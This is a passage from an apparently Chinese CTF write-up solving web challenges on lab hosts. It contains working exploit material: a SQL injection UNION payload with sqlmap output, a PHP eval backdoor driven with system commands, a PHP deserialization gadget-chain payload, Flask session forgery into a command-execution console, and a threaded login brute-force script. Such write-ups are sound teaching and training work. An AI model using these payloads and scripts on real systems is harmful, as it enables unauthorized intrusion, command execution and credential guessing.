#     Payload: http://hgame.vidar.club:42368/books/0' UNION ALL SELECT 2796,CONCAT(0x71706b7171,0x765a4b58495354544b5573744e72657673676b745170794167757965666877464a436e486b5a7775,0x71626a7671),2796#
# ---
# back-end DBMS: MySQL >= 5.6
# Database: book
# Table: seeeeeeeeeeeeeeeecrret
# [1 entry]
# +-------------------------------------+
# | fllllllllllllllllllllllaaa444g      |
# +-------------------------------------+
# | VIDAR{U*Re4lly^Kn0wn_Sql$Inject1on} |
# +-------------------------------------+


# [*] ending @ 13:00:27 /2025-08-21/

```

## The Knife

```shell
❯ python dirsearch.py -u 'hgame.vidar.club:44885' -w ~/Downloads/CommonBackdoors-PHP.fuzz.txt
/home/veno/Projects/dirsearch/lib/core/installation.py:24: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, asp, aspx, jsp, html, htm | HTTP method: GET | Threads: 25 | Wordlist size: 422

Target: http://hgame.vidar.club:44885/

[17:19:06] Scanning: 
[17:19:35] 200 -   610B - /php-backdoor.php

Task Completed

```

```php
<?php
//try to exploit this backdoor function
    highlight_file(__FILE__);
    @eval($_POST['ha_ha_you_find_me']);
```

```text
POST /php-backdoor.php HTTP/1.1
Host: hgame.vidar.club:44885
Accept-Language: zh-CN,zh;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Content-Length: 167
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryG7hJ9x7x2jygYj7K

------WebKitFormBoundaryG7hJ9x7x2jygYj7K
Content-Disposition: form-data; name="ha_ha_you_find_me"

system('ls -la /');
------WebKitFormBoundaryG7hJ9x7x2jygYj7K--



HTTP/1.1 200 OK
Date: Thu, 21 Aug 2025 09:31:39 GMT
Server: Apache/2.4.54 (Debian)
X-Powered-By: PHP/7.4.33
Vary: Accept-Encoding
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8
Content-Length: 1710

<code><span style="color: #000000">
<span style="color: #0000BB">&lt;?php<br /></span><span style="color: #FF8000">//try&nbsp;to&nbsp;exploit&nbsp;this&nbsp;backdoor&nbsp;function<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">highlight_file</span><span style="color: #007700">(</span><span style="color: #0000BB">__FILE__</span><span style="color: #007700">);<br />&nbsp;&nbsp;&nbsp;&nbsp;@eval(</span><span style="color: #0000BB">$_POST</span><span style="color: #007700">[</span><span style="color: #DD0000">'ha_ha_you_find_me'</span><span style="color: #007700">]);</span>
</span>
</code>total 80
drwxr-xr-x    1 root root 4096 Aug 21 08:17 .
drwxr-xr-x    1 root root 4096 Aug 21 08:17 ..
drwxr-xr-x    1 root root 4096 Nov 15  2022 bin
drwxr-xr-x    2 root root 4096 Sep  3  2022 boot
drwxr-xr-x    5 root root  360 Aug 21 08:17 dev
drwxr-xr-x    1 root root 4096 Aug 21 08:17 etc
drwxr-xr-x    2 root root 4096 Sep  3  2022 home
drwxr-xr-x    1 root root 4096 Nov 15  2022 lib
drwxr-xr-x    2 root root 4096 Nov 14  2022 lib64
drwxr-xr-x    2 root root 4096 Nov 14  2022 media
drwxr-xr-x    2 root root 4096 Nov 14  2022 mnt
drwxr-xr-x    2 root root 4096 Nov 14  2022 opt
dr-xr-xr-x 1489 root root    0 Aug 21 08:17 proc
drwx------    1 root root 4096 Nov 15  2022 root
drwxr-xr-x    1 root root 4096 Aug 21 08:17 run
drwxr-xr-x    1 root root 4096 Nov 15  2022 sbin
drwxr-xr-x    2 root root 4096 Nov 14  2022 srv
dr-xr-xr-x   13 root root    0 Aug 19 04:45 sys
-rw-r--r--    1 root root   57 Aug 18 13:41 this_is_flag_68b329da9893e34.txt
drwxrwxrwt    1 root root 4096 Nov 15  2022 tmp
drwxr-xr-x    1 root root 4096 Nov 14  2022 usr
drwxr-xr-x    1 root root 4096 Nov 15  2022 var
```

## My Notebook

PHP 反序列化。

PHP 中，一些特殊函数被称为 "魔术方法" (Magic Methods)，它们以 __ (两个下划线) 开头，会在对象的特定生命周期自动被调用。

- __construct(): 创建对象时调用。

- __destruct(): 对象被销毁时调用。

- __call(): 调用一个对象中不存在的方法时调用。

- __get(): 读取一个对象中不存在的属性时调用。

我们的目标是读取 `/flag` 文件。我们来分析 `mainclass.php` 中的 "小工具" 如何串联起来：

- 终点 (Payload): Evil 类看起来最可疑。

它有一个 `__get($Attribute)` 魔术方法。当我们试图读取这个类中一个不存在的属性时（例如`$evil_object->web`），这个方法就会被触发。

在 `__get` 方法内部，它执行了 `file_get_contents($this->file)`。这正是我们想要的文件读取功能！

所以，我们的目标是触发 `Evil` 类的 `__get` 方法，并且要控制 `$this->file` 的值为 `/flag`。

- 第二环 (Middle Gadget): 谁能触发 `Evil` 类的 `__get` 方法呢？

看看 `GoGoGo` 类。它有一个 `__call($name, $arguments)` 魔术方法。当我们试图调用这个类中一个不存在的方法时（例如`$gogo_object->gogogo()`），这个方法会被触发。

在 `__call` 方法内部，它执行了 `return $this->go->web`。这正好是去读取 `$this->go` 这个属性所指向的对象的 `web` 属性。

如果我们让 `$this->go` 指向我们准备好的 `Evil` 对象，那么 `_call` 触发时，就会去执行 `$evil_object->web`，因为 `web` 属性在 `Evil` 类中不存在，所以就会完美地触发 `Evil` 类的 `__get` 方法！

- 起点 (The Trigger): 谁又能触发 `GoGoGo` 类的 `__call` 方法呢？

看看 `HereWeGo` 类。它有一个 `__destruct()` 魔术方法。这个方法在一个对象的所有引用都被删除或者脚本执行结束时自动调用。`unserialize()` 创建的对象在脚本执行完毕后就会被销毁，从而触发 `__destruct`。

在 `__destruct` 方法内部，它执行了 `$this->try->gogogo()`。这正好是去调用 `$this->try` 这个属性所指向的对象的 `gogogo` 方法。

如果我们让 `$this->try` 指向我们准备好的 `GoGoGo` 对象，因为 `gogogo` 方法在 `GoGoGo` 类中不存在，所以就会完美地触发 `GoGoGo` 类的 `__call` 方法！

```php
<?php
class HereWeGo{
    public $try;
    public function __destruct(){
        $this->try->gogogo();
    }
}

class GoGoGo{
    public $go;

    public function __construct($go)
    {
        $this->go = $go;
    }

    public function __call($name,$arguments){
        return $this->go->web;
    }
}

class Evil{
    public $file;
    public $final;

    public function __construct($file){
        $this->file = $file;
    }
    //The flag is in /flag
    public function __get($Attribute){
        $result = file_get_contents($this->file);
        if(preg_match('/vidar/i',$result)){
            $this->final = "HACKER!!!";
            file_put_contents('flag.txt',$this->final);
            return;
        }
        $this->final = $result;
        file_put_contents('flag.txt',$this->final);
    }
}

// 1. 创建最终执行任务的 Evil 对象，并设置好要读取的文件路径, 用 base64 绕过 vidar 字符检测
$evil_object = new Evil("php://filter/read=convert.base64-encode/resource=/flag");

// 2. 创建中间的 GoGoGo 对象，它的 go 属性指向 Evil 对象
$gogo_object = new GoGoGo($evil_object);

// 3. 创建起始的 HereWeGo 对象，它的 try 属性指向 GoGoGo 对象
$herewego_object = new HereWeGo();
$herewego_object->try = $gogo_object;

// 4. 将最外层的对象序列化，生成我们的 payload
$payload = serialize($herewego_object);

// 5. 打印 payload
echo $payload;
?>
// payload: O:8:"HereWeGo":1:{s:3:"try";O:6:"GoGoGo":1:{s:2:"go";O:4:"Evil":2:{s:4:"file";s:54:"php://filter/read=convert.base64-encode/resource=/flag";s:5:"final";N;}}}
```

在 notebook 中添加这个 payload，再访问 /flag.txt, 得到 base64 编码后的 flag。


## Ztype

不让用 f12, 所以右键 view-source。

```javascript
// lib/game/menus/game-over.js
ig.baked = true;
ig.module('game.menus.game-over').requires('game.menus.base', 'game.menus.interstitial', 'game.menus.stats').defines(function () {
    MenuItemInterstitial = MenuItem.extend({
        getText: function () {
            return 'back to title';
        }, ok: function () {
            ig.game.menu = new MenuInterstitial();
        }
    });
    MenuGameOver = Menu.extend({
        itemClasses: [MenuItemBack],
        scale: 0.75,
        personalBestBadge: new ig.Image('media/ui/personal-best-badge.png'),
        fontTitle: new ig.Font('media/fonts/avenir-36-blue.png'),
        separatorBar: new ig.Image('media/ui/bar-blue.png'),
        init: function () {
            var lastBannerTime = parseInt(localStorage.getItem('bannerTime')) || 0;
            if (lastBannerTime < Date.now() / 1000 - 24 * 60 * 60) {
                localStorage.setItem('bannerTime', (Date.now() / 1000) | 0);
                this.itemClasses[0] = MenuItemInterstitial;
            }
            this.parent();
            this.y = (ig.system.height - 130) / this.scale;
            this.width = ig.system.width / this.scale;
            this.stats = new StatsView(432, ig.system.height - 500);
            this.stats.submit({
                score: ig.game.score,
                wave: ig.game.wave.wave,
                streak: ig.game.longestStreak,
                accuracy: ig.game.hits ? ig.game.hits / (ig.game.hits + ig.game.misses) * 100 : 0
            });
            this.timer = new ig.Timer();
        },
        // FLAG IS HERE!!!
        o: function()
        {
            const as = ['{', '_', '12', 'F', 'n0', '3_', 'r', 'm0', 'V', '}', 'id', 'ar'];
            const u = [8, 10, 11, 0, 4, 1, 7, 6, 5, 3, 2, 9];
            return u.map(p => as[p]).join('');
        },
        update: function () {
            if (this.timer.delta() > 1.5) {
                this.parent();
            }
        },
        draw: function () {
            this.parent();
            var xs = ig.system.width / 2;
            var ys = 25;
            var acc = ig.game.hits ? ig.game.hits / (ig.game.hits + ig.game.misses) * 100 : 0;
            var ctx = ig.system.context;
            var ss = 0.5;
            ctx.save();
            ctx.scale(ss, ss);
            ctx.globalAlpha = 0.5;
            this.font.draw('FINAL SCORE', 24 / ss, (ys + 0) / ss);
            this.font.draw('YOU REACHED', 252 / ss, (ys + 0) / ss);
            this.font.draw('ACCURACY', 24 / ss, (ys + 140) / ss);
            this.font.draw('LONGEST STREAK', 252 / ss, (ys + 140) / ss);
            ctx.restore();
            this.fontTitle.draw(ig.game.score.zeroFill(6), 24, ys + 25);
            this.fontTitle.draw('WAVE ' + ig.game.wave.wave.zeroFill(3), 252, ys + 25);
            ig.system.context.drawImage(this.separatorBar.data, 24, ys + 70, 432, 2);
            this.fontTitle.draw(acc.round(1) + '%', 24, ys + 165);
            this.fontTitle.draw(ig.game.longestStreak, 252, ys + 165);
            
            if (ig.game.score >= 5000) this.fontTitle.draw(this.o(), 24, ys + 250);
            
            ig.system.context.drawImage(this.separatorBar.data, 24, ys + 210, 432, 2);
        }
    });
});
```

## webx-0

```html
GET / HTTP/1.1
Host: hgame.vidar.club:41279
Accept-Language: zh-CN,zh;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://hgame.vidar.club:41279/?
Accept-Encoding: gzip, deflate, br
Connection: keep-alive


HTTP/1.1 200 OK
Server: gunicorn
Date: Thu, 21 Aug 2025 15:45:54 GMT
Connection: close
Content-Type: text/html; charset=utf-8
Content-Length: 1658

<!DOCTYPE html>
<html lang="zh-CN">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>登录界面</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            background-color: #f0f4f8;
        }

        form {
            background-color: white;
            padding: 20px 30px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }

        h2 {
            text-align: center;
            color: #333;
            margin-bottom: 20px;
        }

        input {
            width: 100%;
            padding: 10px;
            margin-bottom: 15px;
            border: 1px solid #ccc;
            border-radius: 4px;
            outline: none;
            transition: border-color 0.3s ease;
        }

        input:focus {
            border-color: #007BFF;
        }

        button {
            width: 100%;
            padding: 10px;
            background-color: #007BFF;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }

        button:hover {
            background-color: #0056b3;
        }
    </style>
</head>

<body>
    <form>
        <h2>用户登录</h2>
        <input type="text" placeholder="用户名">
        <input type="password" placeholder="密码">
        <button>登录</button>
    </form>
</body>

</html>
```

可以在响应中看到服务器是 gunicorn, 大概率是flask, 我觉得mini应该不会用django。首页的登陆啥都没写，只是原地TP, 所以找下有没有其他的 API. 用dirsearch 扫了一下 Seclists/Discovery/Web-Content/common.txt, 扫到了robots.txt, 看一下内容:

```txt
# robots.txt
User-agent: *
Disallow: /backdoor

session=E:OH48NH`6f!1E6dco2c"hESB8UzwP"QlXAeA?TN!1E]F8Xj{7w2@yrj(T?W$DKU$w[bP
```

看一下 /backdoor

```txt
GET /backdoor HTTP/1.1
Host: hgame.vidar.club:41279
Accept-Language: zh-CN,zh;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Connection: keep-alive


HTTP/1.1 403 FORBIDDEN
Server: gunicorn
Date: Thu, 21 Aug 2025 12:52:18 GMT
Connection: close
Content-Type: text/html; charset=utf-8
Content-Length: 22

Only admin can do this
```

上面robots.txt里，标着session，但是怎么看都像是session的secret key而非session本身。但是之前的所有返回里我们也找不到响应里面哪里有 Set-Cookie 之类的响应头，可能服务端压根没写这块逻辑。

试试看能不能 POST / 得到一个 Cookie

```shell
❯ curl -X POST 'http://hgame.vidar.club:41279/' \
--data 'username=test&password=test' \
-v
# Note: Unnecessary use of -X or --request, POST is already inferred.
# * Host hgame.vidar.club:41279 was resolved.
# * IPv6: (none)
# * IPv4: 198.18.0.105
# *   Trying 198.18.0.105:41279...
# * Connected to hgame.vidar.club (198.18.0.105) port 41279
# * using HTTP/1.x
# > POST / HTTP/1.1
# > Host: hgame.vidar.club:41279
# > User-Agent: curl/8.15.0
# > Accept: */*
# > Content-Length: 27
# > Content-Type: application/x-www-form-urlencoded
# > 
# * upload completely sent off: 27 bytes
# < HTTP/1.1 405 METHOD NOT ALLOWED
# < Server: gunicorn
# < Date: Thu, 21 Aug 2025 16:07:15 GMT
# < Connection: close
# < Content-Type: text/html; charset=utf-8
# < Allow: HEAD, GET, OPTIONS
# < Content-Length: 153
# < 
# <!doctype html>
# <html lang=en>
# <title>405 Method Not Allowed</title>
# <h1>Method Not Allowed</h1>
# <p>The method is not allowed for the requested URL.</p>
# * shutting down connection #0
```

根路径不让 POST。想不到还能从哪里获取到 Cookie 了，尝试手动构造一下。

```shell
❯ python flask_session_cookie_manager3.py encode -s 'E:OH48NH`6f!1E6dco2c"hESB8UzwP"QlXAeA?TN!1E]F8Xj{7w2@yrj(T?W$DKU$w[bP' -t "{'admin': True}"
# eyJhZG1pbiI6dHJ1ZX0.aKcyfg.17m0LgZ6O7Rz5NP-CWQ5sVYtgBc
❯ python flask_session_cookie_manager3.py encode -s 'E:OH48NH`6f!1E6dco2c"hESB8UzwP"QlXAeA?TN!1E]F8Xj{7w2@yrj(T?W$DKU$w[bP' -t "{'is_admin': True}"
# eyJpc19hZG1pbiI6dHJ1ZX0.aKcyrQ.jppQOyMfCwyMR2XikMvPYaFi_1o
❯ python flask_session_cookie_manager3.py encode -s 'E:OH48NH`6f!1E6dco2c"hESB8UzwP"QlXAeA?TN!1E]F8Xj{7w2@yrj(T?W$DKU$w[bP' -t "{'role': 'admin'}"
# eyJyb2xlIjoiYWRtaW4ifQ.aKczhQ.-CHb8YSltnUMtH-51LV3AAZdhvA
❯ python flask_session_cookie_manager3.py encode -s 'E:OH48NH`6f!1E6dco2c"hESB8UzwP"QlXAeA?TN!1E]F8Xj{7w2@yrj(T?W$DKU$w[bP' -t "{'username': 'admin'}"
# eyJ1c2VybmFtZSI6ImFkbWluIn0.aKczmg.X_FU4YhCc1iek3Qq3eyKlcjBXWs
❯ python flask_session_cookie_manager3.py encode -s 'E:OH48NH`6f!1E6dco2c"hESB8UzwP"QlXAeA?TN!1E]F8Xj{7w2@yrj(T?W$DKU$w[bP' -t "{'user': 'admin'}"
# eyJ1c2VyIjoiYWRtaW4ifQ.aKczsA.bPgFCxX7-Kze4g6MyrqdiAFQZlM
❯ python flask_session_cookie_manager3.py encode -s 'E:OH48NH`6f!1E6dco2c"hESB8UzwP"QlXAeA?TN!1E]F8Xj{7w2@yrj(T?W$DKU$w[bP' -t "{'name': 'admin'}"
# eyJuYW1lIjoiYWRtaW4ifQ.aKczwQ.oV4OtwUyNrUDKQF4Tofs45XHzjw
```

但是把这些得到的 session 扔进 Cookie: session=xxxx, 还是会提示 Only admin can do this. 真的把那个 `E:OH48xxx` 的东西扔进 Cookie 也是一样的。

```txt
GET /backdoor HTTP/1.1
Host: hgame.vidar.club:41279
Accept-Language: zh-CN,zh;q=0.9
Upgrade-Insecure-Requests: 1
Cookie: session=eyJhZG1pbiI6dHJ1ZX0.aKcyfg.17m0LgZ6O7Rz5NP-CWQ5sVYtgBc
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Connection: keep-alive


HTTP/1.1 403 FORBIDDEN
Server: gunicorn
Date: Thu, 21 Aug 2025 15:33:39 GMT
Connection: close
Content-Type: text/html; charset=utf-8
Content-Length: 22

Only admin can do this
```

所以去问了出题人，发现自己想复杂了。题目hint：只需解密无需加密。可能说的就是解密这个session字符串。猜测可能是base91

```txt
E:OH48NH`6f!1E6dco2c"hESB8UzwP"QlXAeA?TN!1E]F8Xj{7w2@yrj(T?W$DKU$w[bP

base91 decode:
RzQ0VE1OSlhHTTNEU05SUkdaQ0RHUUpYR1UzVEdOUlZHNFpBPT09PQ==

base64 decode:
G44TMNJXGM3DSNRRGZCDGQJXGU3TGNRVG4ZA====

base32 decode:
79657369616D3A75736572

HEX decode:
yesiam:user
```

题目说无需再加密，把user改成admin塞进去，Cookie: session=yesiam:admin, 成功访问backdoor

```html
GET /backdoor HTTP/1.1
Host: hgame.vidar.club:42046
Accept-Language: zh-CN,zh;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Cookie: session=yesiam:admin


HTTP/1.1 200 OK
Server: gunicorn
Date: Fri, 22 Aug 2025 04:47:56 GMT
Connection: close
Content-Type: text/html; charset=utf-8
Content-Length: 626

<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <title>Admin Debug Console</title>
    <style>body { font-family: monospace; background-color: #1a1a1a; color: #00ff00; padding: 20px; } h1 { color: #ff4d4d; } pre { background-color: #000; padding: 15px; border: 1px solid #00ff00; white-space: pre-wrap; word-wrap: break-word; }</style>
</head>
<body>
    <h1>[ADMIN] Debug Console</h1>
    <form method="POST">
        <label for="cmd">Execute:</label>
        <input type="text" name="cmd" id="cmd" size="50" autofocus>
        <input type="submit" value="Run">
    </form>
    
    
</body>
</html>
```

剩下的随便玩了。

```html
POST /backdoor HTTP/1.1
Host: hgame.vidar.club:42046
Content-Length: 143
Cache-Control: max-age=0
Accept-Language: zh-CN,zh;q=0.9
Origin: http://hgame.vidar.club:42046
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryF7ub2CqsOg24GhGm
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://hgame.vidar.club:42046/backdoor
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
cookie: session=yesiam:admin

------WebKitFormBoundaryF7ub2CqsOg24GhGm
Content-Disposition: form-data; name="cmd"

cat flag
------WebKitFormBoundaryF7ub2CqsOg24GhGm--
 

HTTP/1.1 200 OK
Server: gunicorn
Date: Fri, 22 Aug 2025 05:13:13 GMT
Connection: close
Content-Type: text/html; charset=utf-8
Content-Length: 701

<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <title>Admin Debug Console</title>
    <style>body { font-family: monospace; background-color: #1a1a1a; color: #00ff00; padding: 20px; } h1 { color: #ff4d4d; } pre { background-color: #000; padding: 15px; border: 1px solid #00ff00; white-space: pre-wrap; word-wrap: break-word; }</style>
</head>
<body>
    <h1>[ADMIN] Debug Console</h1>
    <form method="POST">
        <label for="cmd">Execute:</label>
        <input type="text" name="cmd" id="cmd" size="50" autofocus>
        <input type="submit" value="Run">
    </form>
    
    
    <h3>Output:</h3>
    <pre>Vidar{docT0R_iTs_Y0ur_w1N_@#sad}
</pre>
    
</body>
</html>
```

源码

```python
import subprocess
from flask import Flask, render_template, request, send_from_directory

app = Flask(__name__)

ADMIN_COOKIE_VALUE = "yesiam:admin"

@app.route(/robots.txt)
def serve_robots():
    with open("robots.txt","r") as f:
        file_content = f.read()
    return render_template("file.html", file_content=file_content)

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/backdoor", methods=["GET", "POST"])
def debug_console():
    session_cookie = request.cookies.get("session")
    if session_cookie != ADMIN_COOKIE_VALUE:
        return "Only admin can do this", 403

    output = None
    if request.method == "POST":
        cmd = request.form.get("cmd", "")
        if cmd:
            try:
                output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, text=True)
            except subprocess.CalledProcessError as e:
                output = e.output

    return render_template("backdoor.html", output=output)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8000)
```

[leavesongs 客户端 session 导致的安全问题](https://www.leavesongs.com/PENETRATION/client-session-security.html)

[inhann - flask 漏洞利用小结](https://www.inhann.top/2021/02/25/flask_newer/#session-forgery)


## Easy Login

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import hashlib
import itertools
import string
import time

def md5_hash(text):
    """计算字符串的完整MD5哈希值（32位）"""
    return hashlib.md5(text.encode('utf-8')).hexdigest()

def check_hash_contains(full_hash, target_hash):
    """检查完整哈希值是否包含目标哈希值"""
    return target_hash in full_hash

def brute_force_md5(target_hash, length=4):
    """
    爆破MD5哈希值
    Args:
        target_hash: 目标MD5哈希值
        length: 密码长度（默认4位）
    Returns:
        找到的密码，如果未找到返回None
    """
    # 定义字母字符集（大小写字母）
    charset = string.ascii_letters + string.digits  # a-z, A-Z, 0-9
    
    print(f"开始爆破MD5: {target_hash}")
    print(f"字符集: {charset}")
    print(f"密码长度: {length}")
    print("=" * 50)
    
    start_time = time.time()
    attempts = 0
    
    # 生成所有可能的组合
    for combination in itertools.product(charset, repeat=length):
        password = ''.join(combination)
        attempts += 1
        
        # 计算当前密码的完整MD5值
        current_hash = md5_hash(password)
        
        # 显示进度（每10000次尝试显示一次）
        if attempts % 100_000 == 0:
            elapsed_time = time.time() - start_time
            print(f"已尝试: {attempts:,} 次, 当前密码: {password}, 用时: {elapsed_time:.2f}秒")
        
        # 检查目标哈希值是否包含在完整哈希值中
        if check_hash_contains(current_hash, target_hash):
            elapsed_time = time.time() - start_time
            print("\n" + "=" * 50)
            print(f"找到密码！")
            print(f"密码: {password}")
            print(f"完整MD5: {current_hash}")
            print(f"目标片段: {target_hash}")
            print(f"匹配位置: {current_hash.find(target_hash)}")
            print(f"总尝试次数: {attempts:,}")
            print(f"总用时: {elapsed_time:.2f}秒")
            return password
    
    elapsed_time = time.time() - start_time
    print(f"\n❌ 未找到匹配的密码")
    print(f"总尝试次数: {attempts:,}")
    print(f"总用时: {elapsed_time:.2f}秒")
    return None

def main():
    # 目标MD5哈希值（16位片段）
    target_hash = "fd1859325f7119e9"
    
    print("MD5密码爆破工具（16位哈希片段匹配）")
    print("=" * 50)
    
    # 开始爆破
    result = brute_force_md5(target_hash, length=4)
    
    if result:
        print(f"\n✅ 爆破成功！密码是: {result}")
        # 验证结果
        verify_hash = md5_hash(result)
        print(f"验证完整MD5: {verify_hash}")
        print(f"目标片段: {target_hash}")
        print(f"包含匹配: {'✅' if check_hash_contains(verify_hash, target_hash) else '❌'}")
        if check_hash_contains(verify_hash, target_hash):
            print(f"匹配位置: {verify_hash.find(target_hash)}")
    else:
        print("\n❌ 爆破失败！")

if __name__ == "__main__":
    main()
```

密码前四位是 mini。

```python
import requests
import itertools
import string
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading

# --- 配置区 ---
# 目标URL
TARGET_URL = 'http://hgame.vidar.club:41560/' 
# 并发线程数
MAX_WORKERS = 50
# 目标用户名
USERNAME = 'admin'
# 固定的session cookie
FIXED_SESSION = 'eyJjYXB0Y2hhX2NvZGUiOiIzNzUzIn0.aKhVRw.lbz4-TEuA6pfouw2BOKO-fdM2j8'
# 固定的验证码
FIXED_CAPTCHA = '3753'
# --- 配置结束 ---

# 创建一个全局事件，用于通知所有线程停止
stop_event = threading.Event()
found_password = None

def generate_passwords():
    """
    密码生成器，密码前四位是mini，后面跟数字
    """
    print("[+] 开始生成以 'mini' 开头的密码组合...")
    
    # mini + 3位数字 (mini000, mini001, ..., mini999)
    print("[+] 尝试 mini + 3位数字组合 (mini000 -> mini999)")
    for i in range(1000):
        yield f"mini{i:03d}"

def check_password(password):
    """
    使用固定的session和captcha尝试登录。
    """
    global found_password
    
    # 如果已经找到密码，或者主程序要求停止，则直接返回
    if stop_event.is_set():
        return None

    try:
        # 准备请求头，包含固定的Cookie
        headers = {
            'Host': 'hgame.vidar.club:41560',
            'Cache-Control': 'max-age=0',
            'Accept-Language': 'zh-CN,zh;q=0.9',
            'Origin': 'http://hgame.vidar.club:41560',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Referer': 'http://hgame.vidar.club:41560/',
            'Accept-Encoding': 'gzip, deflate, br',
            'Cookie': f'session={FIXED_SESSION}',
            'Connection': 'keep-alive'
        }
        
        # 准备 POST 数据
        form_data = {
            'username': USERNAME,
            'password': password,
            'captcha': FIXED_CAPTCHA
        }
        
        # 发起 POST 请求尝试登录
        post_resp = requests.post(TARGET_URL, data=form_data, headers=headers, timeout=30, allow_redirects=False)

        # 判断是否成功
        # 登录失败时，服务器返回 302 跳转到 '/'
        # 如果成功，响应可能会是 200 OK，或者跳转到其他页面
        if post_resp.status_code != 302 or post_resp.headers.get('Location') != '/':
             # 可能是登录成功了！
            print(f"\n[+] 可能找到正确密码: {password}")
            print(f"[+] 响应状态码: {post_resp.status_code}")
            print(f"[+] Location头: {post_resp.headers.get('Location', 'None')}")
            print(f"[+] 响应内容长度: {len(post_resp.text)}")
            stop_event.set() # 通知其他线程停止
            found_password = password
            return password

    except requests.exceptions.RequestException as e:
        # 忽略网络错误
        print(f"[!] 尝试密码 {password} 时发生网络错误: {e}")
        return None

    return None


if __name__ == '__main__':
    print(f"[*] 开始对 {TARGET_URL} 进行密码爆破...")
    print(f"[*] 使用固定的session: {FIXED_SESSION[:50]}...")
    print(f"[*] 使用固定的验证码: {FIXED_CAPTCHA}")
    print(f"[*] 使用 {MAX_WORKERS} 个线程.")
    print(f"[*] 密码前缀: mini")
    
    password_generator = generate_passwords()
    
    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        # 创建 future 任务
        futures = {executor.submit(check_password, p) for i, p in zip(range(MAX_WORKERS * 2), password_generator)}
        
        while futures:
            # 等待一个任务完成
            done = next(as_completed(futures))
            futures.remove(done)
            
            result = done.result()
            if result:
                print(f"\n\n[+] ====================================")
                print(f"[+] ✨ 密码找到! ✨: {result}")
                print(f"[+] ====================================")
                # 取消所有还没开始的任务
                executor.shutdown(wait=False, cancel_futures=True)
                break

            # 如果没有找到密码并且没有线程在运行了，就补充新的任务
            if not stop_event.is_set() and len(futures) < MAX_WORKERS:
                 try:
                    next_password = next(password_generator)
                    print(f"[-] 正在尝试密码: {next_password}", end='\r')
                    futures.add(executor.submit(check_password, next_password))
                 except StopIteration:
                     # 所有密码都尝试完了
                     if not futures:
                         break
    
    if not found_password:
        print("\n\n[-] 所有密码组合已尝试完毕，未找到正确密码。")
```

可以使用同一个Cookie和验证码是因为这里题目的验证码信息直接被放在了flask session的第一段。平常写代码可不能这么写。

```shell
❯ python main.py
[*] 开始对 http://hgame.vidar.club:41560/ 进行密码爆破...
[*] 使用固定的session: eyJjYXB0Y2hhX2NvZGUiOiIzNzUzIn0.aKhVRw.lbz4-TEuA6p...
[*] 使用固定的验证码: 3753
[*] 使用 50 个线程.
[*] 密码前缀: mini
